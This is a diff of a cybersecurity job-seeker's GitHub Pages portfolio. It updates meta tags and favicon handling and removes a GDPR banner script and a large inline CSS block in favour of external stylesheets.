@@ -5,1480 +5,78 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
     <!-- SEO Meta Tags -->
-    <title>Muhammad Ramis | OSCP-Certified Cybersecurity Professional | Sheffield University Graduate</title>
-    <meta name="description" content="OSCP-certified cybersecurity specialist and Sheffield University MSc graduate. Seeking junior to mid-level cybersecurity roles in the UK with expertise in penetration testing, vulnerability assessment, and secure development.">
-    <meta name="keywords" content="cybersecurity UK, penetration testing, OSCP certified, Sheffield University, vulnerability assessment, junior cybersecurity roles, Leeds cybersecurity professional">
+    <title>Muhammad Ramis | OSCP Cybersecurity Professional | Full-Stack Developer | Sheffield Graduate</title>
+    <meta name="description" content="OSCP-certified cybersecurity specialist and full-stack developer with 5+ years experience. Sheffield University MSc graduate seeking opportunities in the UK. Expert in penetration testing, secure development, and enterprise architectures.">
+    <meta name="keywords" content="cybersecurity UK, penetration testing, OSCP certified, Sheffield University, full-stack developer, Laravel, Django, blockchain, secure development, Leeds cybersecurity">
     <meta name="author" content="Muhammad Ramis">
-    <meta property="og:title" content="Muhammad Ramis - OSCP Certified Cybersecurity Professional">
-    <meta property="og:description" content="Sheffield University MSc graduate seeking cybersecurity opportunities in the UK. OSCP certified with strong technical background.">
+    <meta property="og:title" content="Muhammad Ramis - OSCP Certified Cybersecurity Professional & Developer">
+    <meta property="og:description" content="Sheffield University MSc graduate with OSCP certification and extensive development experience across multiple tech stacks.">
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://imramis.github.io">
     <link rel="canonical" href="https://imramis.github.io">
     
-    <!-- Enhanced Favicon -->
-    <link rel="icon" type="image/x-icon" href="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiByeD0iNiIgZmlsbD0iIzBmMTcyYSIvPgo8dGV4dCB4PSIxNiIgeT0iMjEiIGZvbnQtZmFtaWx5PSJBcmlhbCwgc2Fucy1zZXJpZiIgZm9udC1zaXplPSIxNCIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IiNkYzI2MjYiIHRleHQtYW5jaG9yPSJtaWRkbGUiPk1SPC90ZXh0Pgo8L3N2Zz4K">
+    <!-- Favicon -->
+    <link rel="icon" type="image/x-icon" href="assets/favicon.ico">
     
-    <!-- GDPR Compliance -->
-    <script>
-        window.addEventListener("load", function(){
-            const gdprModal = document.createElement('div');
-            gdprModal.id = 'gdpr-banner';
-            gdprModal.innerHTML = `
-                <div style="position:fixed;bottom:0;left:0;right:0;background:#00000082;color:#fff;padding:15px;z-index:10000;text-align:center;">
-                    <p style="margin:0 0 10px 0;">This portfolio uses session storage for preferences. No persistent cookies stored due to GitHub.io hosting.</p>
-                    <button onclick="acceptGDPR()" style="background:#dc2626;color:#fff;border:none;padding:8px 16px;margin:0 5px;border-radius:4px;cursor:pointer;">Accept</button>
-                    <button onclick="document.getElementById('gdpr-banner').style.display='none'" style="background:#6b7280;color:#fff;border:none;padding:8px 16px;margin:0 5px;border-radius:4px;cursor:pointer;">Decline</button>
-                </div>
-            `;
-            
-            if (!sessionStorage.getItem('gdpr-accepted')) {
-                document.body.appendChild(gdprModal);
-            }
-        });
-
-        function acceptGDPR() {
-            sessionStorage.setItem('gdpr-accepted', 'true');
-            document.getElementById('gdpr-banner').style.display = 'none';
-        }
-    </script>
-    
-    <!-- Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+    <!-- External CSS -->
+    <link rel="stylesheet" href="css/main.css">
+    <link rel="stylesheet" href="css/themes.css">
+    <link rel="stylesheet" href="css/animations.css">
+    <link rel="stylesheet" href="css/responsive.css">
     
     <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
-    <!-- AOS Animation Library -->
-    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
-    
-    <style>
-        :root {
-            /* Dynamic Theme Variables */
-            --primary-color: #dc2626;
-            --primary-light: #ef4444;
-            --primary-dark: #b91c1c;
-            --secondary-color: #1e293b;
-            --accent-color: #f59e0b;
-            --text-light: #64748b;
-            --text-dark: #1e293b;
-            --bg-light: #f8fafc;
-            --bg-dark: #0f172a;
-            --gradient-1: linear-gradient(135deg, var(--primary-color) 0%, var(--primary-light) 100%);
-            --gradient-2: linear-gradient(135deg, #f59e0b 0%, #ef4444 100%);
-            --shadow-soft: 0 4px 20px rgba(220, 38, 38, 0.08);
-            --shadow-hover: 0 8px 30px rgba(220, 38, 38, 0.12);
-            --neon-glow: 0 0 15px rgba(220, 38, 38, 0.3);
-        }
-
-        /* Theme Variations */
-        [data-theme="blue"] {
-            --primary-color: #0ea5e9;
-            --primary-light: #3b82f6;
-            --primary-dark: #0284c7;
-            --shadow-soft: 0 4px 20px rgba(14, 165, 233, 0.08);
-            --shadow-hover: 0 8px 30px rgba(14, 165, 233, 0.12);
-            --neon-glow: 0 0 15px rgba(14, 165, 233, 0.3);
-        }
-
-        [data-theme="green"] {
-            --primary-color: #059669;
-            --primary-light: #10b981;
-            --primary-dark: #047857;
-            --shadow-soft: 0 4px 20px rgba(5, 150, 105, 0.08);
-            --shadow-hover: 0 8px 30px rgba(5, 150, 105, 0.12);
-            --neon-glow: 0 0 15px rgba(5, 150, 105, 0.3);
-        }
-
-        [data-theme="purple"] {
-            --primary-color: #7c3aed;
-            --primary-light: #8b5cf6;
-            --primary-dark: #6d28d9;
-            --shadow-soft: 0 4px 20px rgba(124, 58, 237, 0.08);
-            --shadow-hover: 0 8px 30px rgba(124, 58, 237, 0.12);
-            --neon-glow: 0 0 15px rgba(124, 58, 237, 0.3);
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Inter', sans-serif;
-            line-height: 1.6;
-            color: var(--text-dark);
-            overflow-x: hidden;
-            background: var(--bg-dark);
-        }
-
-        /* Enhanced Loading Screen */
-        .loading {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #334155 100%);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 10000;
-            transition: opacity 0.5s ease;
-        }
-
-        .loader-container {
-            text-align: center;
-        }
-
-        .cyber-loader {
-            width: 80px;
-            height: 80px;
-            border: 3px solid rgba(220, 38, 38, 0.2);
-            border-top: 3px solid var(--primary-color);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-            box-shadow: var(--neon-glow);
-        }
-
-        .loading-text {
-            color: var(--primary-color);
-            font-family: 'Orbitron', monospace;
-            font-size: 1.2rem;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* Particle Background */
-        #particles-js {
-            position: fixed;
-            width: 100%;
-            height: 100%;
-            top: 0;
-            left: 0;
-            z-index: -1;
-            background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #334155 100%);
-        }
-
-        /* Animated Terminal Commands Background */
-        .terminal-commands {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            overflow: hidden;
-            opacity: 0.8;
-        }
-
-        .command-line {
-            position: absolute;
-            color: var(--primary-color);
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 12px;
-            white-space: nowrap;
-            animation: floatCommand linear infinite;
-        }
-
-        @keyframes floatCommand {
-            0% {
-                transform: translateX(100vw) translateY(0);
-                opacity: 0;
-            }
-            10%, 90% {
-                opacity: 1;
-            }
-            100% {
-                transform: translateX(-100%) translateY(-20px);
-                opacity: 0;
-            }
-        }
-
-        /* Tab-based Navigation */
-        .tab-navigation {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            z-index: 1000;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-
-        .nav-tab {
-            width: 60px;
-            height: 60px;
-            background: rgba(15, 23, 42, 0.9);
-            border: 2px solid var(--primary-color);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: var(--primary-color);
-            cursor: pointer;
-            transition: all 0.3s ease;
-            backdrop-filter: blur(10px);
-            font-size: 1.2rem;
-            position: relative;
-        }
-
-        .nav-tab:hover, .nav-tab.active {
-            background: var(--primary-color);
-            color: white;
-            transform: scale(1.1);
-            box-shadow: var(--neon-glow);
-        }
-
-        /* Enhanced Custom Tooltip */
-        .tooltip {
-            position: absolute;
-            background: rgba(15, 23, 42, 0.95);
-            color: white;
-            padding: 12px 16px;
-            border-radius: 8px;
-            font-size: 13px;
-            font-weight: 500;
-            white-space: nowrap;
-            z-index: 10001;
-            opacity: 0;
-            transform: translateY(10px);
-            transition: all 0.3s ease;
-            pointer-events: none;
-            border: 2px solid var(--primary-color);
-            box-shadow: var(--shadow-hover);
-            backdrop-filter: blur(10px);
-            max-width: 300px;
-            white-space: normal;
-            line-height: 1.4;
-        }
-
-        .tooltip.show {
-            opacity: 1;
-            transform: translateY(0);
-        }
-
-        .tooltip::before {
-            content: '';
-            position: absolute;
-            bottom: -8px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 0;
-            height: 0;
-            border-left: 8px solid transparent;
-            border-right: 8px solid transparent;
-            border-top: 8px solid var(--primary-color);
-        }
-
-        /* Theme Selector */
-        .theme-selector {
-            position: fixed;
-            bottom: 20px;
-            left: 20px;
-            z-index: 1000;
-            display: flex;
-            gap: 10px;
-            background: rgba(15, 23, 42, 0.9);
-            padding: 12px;
-            border-radius: 30px;
-            border: 2px solid var(--primary-color);
-            backdrop-filter: blur(10px);
-        }
-
-        .theme-btn {
-            width: 35px;
-            height: 35px;
-            border-radius: 50%;
-            border: 3px solid transparent;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            position: relative;
-        }
-
-        .theme-btn:hover {
-            transform: scale(1.3);
-            border-color: white;
-            box-shadow: 0 0 15px currentColor;
-        }
-
-        .theme-btn.active {
-            border-color: white;
-            box-shadow: 0 0 20px currentColor;
-            transform: scale(1.2);
-        }
-
-        .theme-btn.red { background: #dc2626; }
-        .theme-btn.blue { background: #0ea5e9; }
-        .theme-btn.green { background: #059669; }
-        .theme-btn.purple { background: #7c3aed; }
-
-        /* Enhanced Navigation */
-        .navbar {
-            position: fixed;
-            top: 0;
-            width: 100%;
-            padding: 1rem 0;
-            background: rgba(15, 23, 42, 0.95);
-            backdrop-filter: blur(15px);
-            z-index: 999;
-            transition: all 0.3s ease;
-            border-bottom: 1px solid var(--primary-color);
-        }
-
-        .nav-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 2rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .logo {
-            font-family: 'Orbitron', monospace;
-            font-size: 1.8rem;
-            font-weight: 900;
-            color: white;
-            text-decoration: none;
-        }
-
-        .nav-links {
-            display: flex;
-            list-style: none;
-            gap: 2rem;
-        }
-
-        .nav-links a {
-            color: white;
-            text-decoration: none;
-            font-weight: 500;
-            transition: all 0.3s ease;
-            position: relative;
-            padding: 0.5rem 1rem;
-            border-radius: 25px;
-        }
-
-        .nav-links a:hover {
-            color: var(--primary-color);
-            background: rgba(220, 38, 38, 0.1);
-        }
-
-        /* Enhanced Hero Section */
-        .hero {
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            color: white;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .hero-background {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            opacity:0.8;
-            background: 
-                radial-gradient(circle at 20% 50%, rgba(220, 38, 38, 0.1) 0%, transparent 50%),
-                radial-gradient(circle at 80% 20%, rgba(220, 38, 38, 0.08) 0%, transparent 50%),
-                linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
-        }
-
-        .hero-content {
-            max-width: 1000px;
-            padding: 6rem 2rem;
-            position: relative;
-            z-index: 1;
-        }
-
-        .professional-badges {
-            display: flex;
-            justify-content: center;
-            gap: 1rem;
-            margin-bottom: 2rem;
-            flex-wrap: wrap;
-        }
-
-        .badge {
-            background: rgba(220, 38, 38, 0.2);
-            border: 2px solid var(--primary-color);
-            padding: 0.5rem 1rem;
-            border-radius: 25px;
-            color: var(--primary-color);
-            font-weight: 600;
-            font-size: 0.9rem;
-            animation: pulse 3s infinite;
-            transition: all 0.3s ease;
-        }
-
-        .badge:hover {
-            background: var(--primary-color);
-            color: white;
-            transform: translateY(-2px);
-        }
-
-        .hero-subtitle {
-            font-size: 1.3rem;
-            color: var(--primary-color);
-            margin-bottom: 1rem;
-            font-weight: 600;
-        }
-
-        .hero-title {
-            font-family: 'Orbitron', monospace;
-            font-size: clamp(2.5rem, 8vw, 4.5rem);
-            font-weight: 900;
-            margin-bottom: 1rem;
-            background: var(--gradient-1);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-
-        .hero-typed {
-            font-size: clamp(1.2rem, 4vw, 2rem);
-            font-weight: 600;
-            margin-bottom: 2rem;
-            height: 60px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #94a3b8;
-        }
-
-        .typed-cursor {
-            color: var(--primary-color);
-            animation: blink 1s infinite;
-        }
-
-        /* UK Status Highlight */
-        .uk-status {
-            background: linear-gradient(135deg, #1e293b 0%, #334155 100%);
-            border: 2px solid var(--primary-color);
-            border-radius: 20px;
-            padding: 2rem;
-            margin: 2rem 0;
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .uk-status::before {
-            content: '🇬🇧';
-            position: absolute;
-            top: -20px;
-            right: -20px;
-            font-size: 4rem;
-            opacity: 0.1;
-            transform: rotate(15deg);
-        }
-
-        .uk-highlight {
-            color: var(--primary-color);
-            font-size: 1.4rem;
-            font-weight: 700;
-            margin-bottom: 1rem;
-        }
-
-        /* Enhanced Terminal */
-        .terminal-window {
-            background: #0d1117;
-            border-radius: 12px;
-            padding: 20px;
-            margin: 30px auto;
-            font-family: 'JetBrains Mono', monospace;
-            border: 2px solid var(--primary-color);
-            position: relative;
-            overflow: hidden;
-            max-width: 900px;
-            box-shadow: var(--shadow-soft);
-        }
-
-        .terminal-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 15px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #30363d;
-        }
-
-        .terminal-buttons {
-            display: flex;
-            gap: 8px;
-        }
-
-        .terminal-btn {
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-        }
-
-        .terminal-btn.red { background: #ff5f56; }
-        .terminal-btn.yellow { background: #ffbd2e; }
-        .terminal-btn.green { background: #27ca3f; }
-
-        .terminal-title {
-            margin-left: 15px;
-            color: #8b949e;
-            font-size: 12px;
-            font-family: 'Orbitron', monospace;
-        }
-
-        .terminal-content {
-            color: var(--primary-color);
-            font-size: 14px;
-            line-height: 1.8;
-            text-align: left;
-        }
-
-        .terminal-prompt {
-            color: #7c3aed;
-        }
-
-        .terminal-command {
-            color: var(--primary-color);
-        }
-
-        .terminal-output {
-            color: #10b981;
-        }
-
-        /* Skills Grid */
-        .skills-section {
-            margin: 4rem 0;
-        }
-
-        .skills-categories {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
-            gap: 2rem;
-            margin-bottom: 3rem;
-        }
-
-        .skill-category {
-            background: rgba(15, 23, 42, 0.9);
-            border: 1px solid var(--primary-color);
-            border-radius: 15px;
-            padding: 2rem;
-            transition: all 0.3s ease;
-        }
-
-        .skill-category:hover {
-            transform: translateY(-5px);
-            box-shadow: var(--shadow-hover);
-            border-color: var(--primary-light);
-        }
-
-        .skill-category-title {
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-            color: var(--primary-color);
-            font-size: 1.3rem;
-            font-weight: 700;
-            margin-bottom: 1.5rem;
-        }
-
-        .skill-tags {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 0.8rem;
-        }
-
-        .skill-tag {
-            background: rgba(220, 38, 38, 0.1);
-            border: 1px solid var(--primary-color);
-            color: var(--primary-color);
-            padding: 0.5rem 1rem;
-            border-radius: 20px;
-            font-size: 0.9rem;
-            font-weight: 500;
-            transition: all 0.3s ease;
-            cursor: pointer;
-        }
-
-        .skill-tag:hover {
-            background: var(--primary-color);
-            color: white;
-            transform: translateY(-2px);
-            box-shadow: var(--shadow-soft);
-        }
-
-        /* Enhanced Timeline */
-        .timeline-section {
-            margin: 4rem 0;
-        }
-
-        .timeline {
-            position: relative;
-            max-width: 1000px;
-            margin: 0 auto;
-            padding: 2rem 0;
-        }
-
-        .timeline::before {
-            content: '';
-            position: absolute;
-            left: 50%;
-            top: 0;
-            bottom: 0;
-            width: 3px;
-            background: linear-gradient(to bottom, var(--primary-color), var(--primary-light));
-            transform: translateX(-50%);
-        }
-
-        .timeline-item {
-            position: relative;
-            margin: 3rem 0;
-            width: 45%;
-        }
-
-        .timeline-item:nth-child(odd) {
-            left: 0;
-            text-align: right;
-        }
-
-        .timeline-item:nth-child(even) {
-            left: 55%;
-            text-align: left;
-        }
-
-        .timeline-content {
-            background: rgba(15, 23, 42, 0.95);
-            border: 2px solid var(--primary-color);
-            border-radius: 15px;
-            padding: 2rem;
-            position: relative;
-            transition: all 0.3s ease;
-        }
-
-        .timeline-content:hover {
-            transform: scale(1.02);
-            box-shadow: var(--shadow-hover);
-        }
-
-        .timeline-date {
-            background: var(--primary-color);
-            color: white;
-            padding: 0.5rem 1rem;
-            border-radius: 20px;
-            font-weight: 600;
-            display: inline-block;
-            margin-bottom: 1rem;
-        }
-
-        .timeline-role {
-            color: var(--primary-color);
-            font-size: 1.4rem;
-            font-weight: 700;
-            margin-bottom: 0.5rem;
-        }
-
-        .timeline-company {
-            color: #94a3b8;
-            font-size: 1.1rem;
-            margin-bottom: 1rem;
-        }
-
-        .timeline-dot {
-            position: absolute;
-            top: 2rem;
-            width: 20px;
-            height: 20px;
-            background: var(--primary-color);
-            border: 4px solid var(--bg-dark);
-            border-radius: 50%;
-            z-index: 1;
-        }
-
-        .timeline-item:nth-child(odd) .timeline-dot {
-            right: -61px;
-        }
-
-        .timeline-item:nth-child(even) .timeline-dot {
-            left: -61px;
-        }
-
-        /* Auto-sliding Project Carousel */
-        .projects-carousel {
-            position: relative;
-            max-width: 1200px;
-            margin: 0 auto;
-            overflow: hidden;
-            border-radius: 20px;
-            border: 2px solid var(--primary-color);
-            background: rgba(15, 23, 42, 0.9);
-        }
-
-        .carousel-container {
-            display: flex;
-            transition: transform 0.8s ease-in-out;
-        }
-
-        .carousel-slide {
-            min-width: 100%;
-            padding: 3rem;
-            text-align: center;
-        }
-
-        .project-category-header {
-            color: var(--primary-color);
-            font-size: 1.8rem;
-            font-weight: 700;
-            margin-bottom: 2rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 1rem;
-        }
-
-        .projects-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 2rem;
-        }
-
-        .project-card {
-            background: rgba(15, 23, 42, 0.9);
-            border: 1px solid var(--primary-color);
-            border-radius: 15px;
-            padding: 2rem;
-            transition: all 0.3s ease;
-            cursor: pointer;
-        }
-
-        .project-card:hover {
-            transform: translateY(-8px);
-            box-shadow: var(--shadow-hover);
-            border-color: var(--primary-light);
-        }
-
-        .project-title {
-            color: var(--primary-color);
-            font-size: 1.3rem;
-            font-weight: 700;
-            margin-bottom: 1rem;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-
-        .project-type {
-            background: rgba(220, 38, 38, 0.2);
-            color: var(--primary-color);
-            padding: 0.3rem 0.8rem;
-            border-radius: 15px;
-            font-size: 0.8rem;
-            font-weight: 600;
-        }
-
-        .project-tech {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 0.5rem;
-            margin-top: 1rem;
-        }
-
-        .tech-badge {
-            background: var(--primary-color);
-            color: white;
-            padding: 0.3rem 0.8rem;
-            border-radius: 12px;
-            font-size: 0.8rem;
-            font-weight: 500;
-            display: inline-block;
-            margin: 0.1rem;
-        }
-
-        .carousel-controls {
-            position: absolute;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            display: flex;
-            gap: 10px;
-        }
-
-        .carousel-dot {
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.3);
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .carousel-dot.active {
-            background: var(--primary-color);
-            transform: scale(1.3);
-        }
-
-        /* Enhanced Certifications Section */
-        .certifications-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 2rem;
-            margin-bottom: 3rem;
-        }
-
-        .cert-card {
-            background: rgba(15, 23, 42, 0.95);
-            border: 2px solid var(--primary-color);
-            border-radius: 20px;
-            padding: 2.5rem;
-            text-align: center;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-
-/*         .cert-card::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: conic-gradient(from 0deg, transparent, var(--primary-color), transparent);
-            animation: rotate 8s linear infinite;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-        }
-
-        .cert-card:hover::before { */
-            opacity: 0.1;
-        }
-
-        .cert-card:hover {
-            transform: translateY(-10px) scale(1.02);
-            box-shadow: var(--shadow-hover);
-            border-color: var(--primary-light);
-        }
-
-        .cert-card.featured {
-            border-width: 3px;
-            background: rgba(220, 38, 38, 0.05);
-        }
-
-        .cert-card.in-progress {
-            border-color: #f59e0b;
-            background: rgba(245, 158, 11, 0.05);
-        }
-
-        .cert-card.academic {
-            border-color: #7c3aed;
-            background: rgba(124, 58, 237, 0.05);
-        }
-
-        .cert-badge {
-            width: 80px;
-            height: 80px;
-            background: var(--gradient-1);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 1.5rem;
-            box-shadow: var(--neon-glow);
-        }
-
-        .cert-card.in-progress .cert-badge {
-            background: linear-gradient(135deg, #f59e0b 0%, #eab308 100%);
-        }
-
-        .cert-card.academic .cert-badge {
-            background: linear-gradient(135deg, #7c3aed 0%, #8b5cf6 100%);
-        }
-
-        .cert-badge i {
-            font-size: 2.5rem;
-            color: white;
-        }
-
-        .cert-name {
-            font-size: 2rem;
-            font-weight: 900;
-            color: var(--primary-color);
-            margin-bottom: 0.5rem;
-            font-family: 'Orbitron', monospace;
-        }
-
-        .cert-card.in-progress .cert-name {
-            color: #f59e0b;
-        }
-
-        .cert-card.academic .cert-name {
-            color: #7c3aed;
-        }
-
-        .cert-full-name {
-            font-size: 1.1rem;
-            font-weight: 600;
-            color: white;
-            margin-bottom: 1rem;
-        }
-
-        .cert-org {
-            color: #94a3b8;
-            font-size: 1rem;
-            margin-bottom: 1rem;
-        }
-
-        .cert-date {
-            background: var(--primary-color);
-            color: white;
-            padding: 0.5rem 1rem;
-            border-radius: 20px;
-            font-weight: 600;
-            display: inline-block;
-            margin-bottom: 1rem;
-        }
-
-        .cert-card.in-progress .cert-date {
-            background: #f59e0b;
-        }
-
-        .cert-card.academic .cert-date {
-            background: #7c3aed;
-        }
-
-        .cert-status {
-            font-size: 0.9rem;
-            font-weight: 600;
-            margin-bottom: 1rem;
-        }
-
-        .cert-status.verified a {
-            text-decoration: none;
-            color: #10b981;
-        }
-
-        .cert-status.in-progress {
-            color: #f59e0b;
-        }
-
-        .cert-description {
-            color: #94a3b8;
-            font-size: 0.9rem;
-            line-height: 1.5;
-        }
-
-        .cert-achievements {
-            display: flex;
-            justify-content: center;
-            gap: 2rem;
-            flex-wrap: wrap;
-            margin-top: 3rem;
-        }
-
-        .achievement-item {
-            background: rgba(15, 23, 42, 0.9);
-            border: 1px solid var(--primary-color);
-            border-radius: 15px;
-            padding: 1rem 2rem;
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-            color: white;
-            transition: all 0.3s ease;
-        }
-
-        .achievement-item:hover {
-            transform: translateY(-3px);
-            box-shadow: var(--shadow-soft);
-            border-color: var(--primary-light);
-        }
-
-        .achievement-item i {
-            color: var(--primary-color);
-            font-size: 1.5rem;
-        }
-
-        /* Enhanced Skills with Proficiency Meters */
-        .skill-tag {
-            background: rgba(220, 38, 38, 0.1);
-            border: 1px solid var(--primary-color);
-            color: var(--primary-color);
-            padding: 0.5rem 1rem;
-            border-radius: 20px;
-            font-size: 0.9rem;
-            font-weight: 500;
-            transition: all 0.3s ease;
-            cursor: pointer;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .skill-tag::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            height: 3px;
-            background: var(--primary-color);
-            transition: width 0.3s ease;
-        }
-
-        .skill-tag.expert::after { width: 95%; }
-        .skill-tag.advanced::after { width: 80%; }
-        .skill-tag.intermediate::after { width: 65%; }
-        .skill-tag.beginner::after { width: 40%; }
-
-        .skill-tag:hover {
-            background: var(--primary-color);
-            color: white;
-            transform: translateY(-2px);
-            box-shadow: var(--shadow-soft);
-        }
-
-        /* Enhanced Statistics */
-        .enhanced-stats {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 2rem;
-            margin: 3rem 0;
-        }
-
-        .stat-card {
-            background: rgba(220, 38, 38, 0.05);
-            border: 2px solid var(--primary-color);
-            border-radius: 20px;
-            padding: 2rem;
-            text-align: center;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .stat-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(220, 38, 38, 0.1), transparent);
-            transition: left 0.5s ease;
-        }
-        .matrix-rain {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            opacity: 0.7;
-            overflow: hidden;
-        }
-
-        .matrix-char {
-            position: absolute;
-            color: var(--primary-color);
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 14px;
-            animation: matrixFall linear infinite;
-            text-shadow: 0 0 5px var(--primary-color);
-        }
-
-        @keyframes matrixFall {
-            0% {
-                transform: translateY(-100vh);
-                opacity: 1;
-            }
-            100% {
-                transform: translateY(100vh);
-                opacity: 0;
-            }
-        }
-        .stat-card:hover::before {
-            left: 100%;
-        }
-
-        .stat-card:hover {
-            transform: translateY(-5px) scale(1.02);
-            box-shadow: var(--shadow-hover);
-        }
-
-        .stat-icon {
-            font-size: 3rem;
-            color: var(--primary-color);
-            margin-bottom: 1rem;
-        }
-
-        .stat-number {
-            font-size: 2.8rem;
-            font-weight: 900;
-            color: var(--primary-color);
-            margin-bottom: 0.5rem;
-            font-family: 'Orbitron', monospace;
-        }
-
-        .stat-label {
-            color: var(--text-light);
-            font-weight: 600;
-            margin-bottom: 0.5rem;
-        }
-
-        .stat-description {
-            color: var(--text-light);
-            font-size: 0.9rem;
-            line-height: 1.4;
-        }
-        .section {
-            padding: 5rem 0;
-            max-width: 1200px;
-            margin: 0 auto;
-            padding-left: 2rem;
-            padding-right: 2rem;
-            position: relative;
-        }
-
-        .section-white {
-            background: linear-gradient(135deg, #ffffff 0%, #f8fafc 100%);
-            color: var(--text-dark);
-        }
-
-        .section-dark {
-            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
-            color: white;
-        }
-
-        .section-title {
-            font-family: 'Orbitron', monospace;
-            font-size: 2.8rem;
-            font-weight: 900;
-            text-align: center;
-            margin-bottom: 1rem;
-            background: var(--gradient-1);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-
-        .section-subtitle {
-            text-align: center;
-            color: var(--text-light);
-            margin-bottom: 3rem;
-            font-size: 1.2rem;
-            max-width: 700px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-
-        /* Interactive Resume Button */
-        .resume-btn {
-            background: var(--gradient-1);
-            color: white;
-            border: none;
-            padding: 1rem 2.5rem;
-            border-radius: 50px;
-            font-weight: 700;
-            font-size: 1.1rem;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            display: inline-flex;
-            align-items: center;
-            gap: 0.8rem;
-            margin: 1rem;
-            text-decoration: none;
-            position: relative;
-            overflow: hidden;
-            box-shadow: var(--shadow-soft);
-        }
-
-        .resume-btn:hover {
-            transform: translateY(-3px) scale(1.05);
-            box-shadow: var(--shadow-hover);
-        }
-
-        .resume-btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-            transition: left 0.5s ease;
-        }
-
-        .resume-btn:hover::before {
-            left: 100%;
-        }
-
-        /* Contact Section */
-        .contact-enhanced {
-            background: var(--bg-dark);
-            color: white;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .contact-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 2rem;
-            margin: 3rem 0;
-        }
-
-        .contact-card {
-            background: rgba(15, 23, 42, 0.9);
-            border: 2px solid var(--primary-color);
-            border-radius: 15px;
-            padding: 2rem;
-            text-align: center;
-            transition: all 0.3s ease;
-        }
-
